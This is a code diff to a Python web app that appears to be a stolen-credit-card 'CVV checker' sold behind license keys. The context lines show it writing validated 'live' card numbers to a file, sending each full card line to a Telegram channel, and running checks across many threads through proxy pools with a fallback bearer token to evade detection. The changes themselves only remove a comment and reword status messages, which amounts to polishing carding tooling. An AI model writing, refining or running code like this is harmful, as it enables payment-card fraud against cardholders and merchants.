@@ -81,7 +81,6 @@ def save_live_card(card_line, detail):
     try:
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
             f.write(f"{card_line} | {detail}\n")
-        # Send live card notification directly to Telegram
         send_telegram_alert(f"<b>⚡ KYU CVV HIT! ⚡</b>\n<code>{card_line}</code>\n💬 <i>{detail}</i>")
     except Exception:
         pass
@@ -251,7 +250,7 @@ def verify_key():
 
     key_info = keys_data[incoming_key]
     if key_info.get('status') != 'active':
-        return jsonify({"success": False, "message": "Key inactive/expired."})
+        return jsonify({"success": False, "message": "Key inactive or expired."})
 
     expires_ts = key_info.get('expires_ts')
     if expires_ts and int(datetime.now(timezone.utc).timestamp()) > expires_ts:
@@ -494,10 +493,10 @@ def background_worker(cards, proxies_list, max_threads):
                 valid_proxies.append(p_str)
         
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
-        checker_queue.put({"status_msg": f"Proxy check done: {len(valid_proxies)}/{total_proxies} working. Starting threads..."})
+        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)}/{total_proxies} active. Starting threads..."})
     else:
         proxy_pool = None
-        checker_queue.put({"status_msg": "Running proxyless mode with threads..."})
+        checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})
 
     token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
     counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
